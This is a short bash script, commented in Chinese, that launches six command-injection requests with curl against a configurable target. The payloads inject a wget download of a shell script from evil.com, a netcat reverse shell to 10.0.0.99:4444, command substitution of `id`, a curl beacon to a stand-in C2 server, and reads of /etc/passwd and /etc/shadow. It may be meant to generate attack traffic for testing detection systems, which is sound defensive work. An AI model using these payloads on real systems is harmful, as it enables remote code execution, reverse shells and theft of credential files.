#!/bin/bash
# 命令注入攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./cmd_injection.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[命令注入] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/6] ; wget 下载shell"
curl -s "http://$TARGET/ping?host=8.8.8.8;%20wget%20http://evil.com/shell.sh" > /dev/null
sleep 0.3

echo "  [2/6] | nc 反弹shell"
curl -s "http://$TARGET/cgi-bin/status?cmd=%7C%20nc%20-e%20/bin/bash%2010.0.0.99%204444" > /dev/null
sleep 0.3

echo "  [3/6] \`id\` 命令替换"
curl -s -X POST "http://$TARGET/exec" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "cmd=%60id%60" > /dev/null
sleep 0.3

echo "  [4/6] ; curl C2外联"
curl -s "http://$TARGET/cgi-bin/status?cmd=%3Bcurl%20http://c2.server.com/beacon" > /dev/null
sleep 0.3

echo "  [5/6] /bin/cat /etc/passwd"
curl -s "http://$TARGET/admin/exec?cmd=/bin/cat%20/etc/passwd" > /dev/null
sleep 0.3

echo "  [6/6] /bin/ls + /etc/shadow"
curl -s "http://$TARGET/admin/exec?cmd=/bin/ls%20-la%20/etc/shadow" > /dev/null
sleep 0.3

echo "[命令注入] 完成 (6 次攻击)"
